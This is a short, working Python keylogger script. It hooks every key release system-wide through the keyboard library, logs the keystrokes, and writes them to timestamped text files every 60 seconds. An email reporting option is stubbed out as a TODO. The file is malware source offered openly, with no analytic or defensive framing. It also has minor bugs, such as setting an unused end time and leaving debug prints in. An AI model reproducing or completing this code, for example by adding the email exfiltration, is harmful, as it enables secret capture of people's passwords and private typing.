import keyboard                 #one of the limitations of this is that it makes no effort to hide itself, so using this in keyloggers is not recommended
from threading import Timer
from datetime import datetime

report_interval = 60

class Keylogger:
    def __init__(self,interval = 60, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start = datetime.now()
        self.stop = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        start_str = str(self.start)[:-7].replace(" ", "-").replace(":", "")
        end_str = str(self.stop)[:-7].replace(" ", "-").replace(":", "")

        self.filename = f"keylog-{start_str}_{end_str}"
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.end = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                print("todo")
                ## TODO
            elif self.report_method == "file":
                self.report_to_file()
            self.start = datetime.now()
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        timer.start()

    def starter(self):
        self.start = datetime.now()
        keyboard.on_release(callback = self.callback)
        self.report()
        print(3)
        keyboard.wait()
        print(4)

if __name__ == "__main__":
    #keylogger = Keylogger(interval = report_interval, report_method = "email")
    keylogger = Keylogger(interval = report_interval, report_method = "file")
    print(1)
    keylogger.starter()
    print(2)
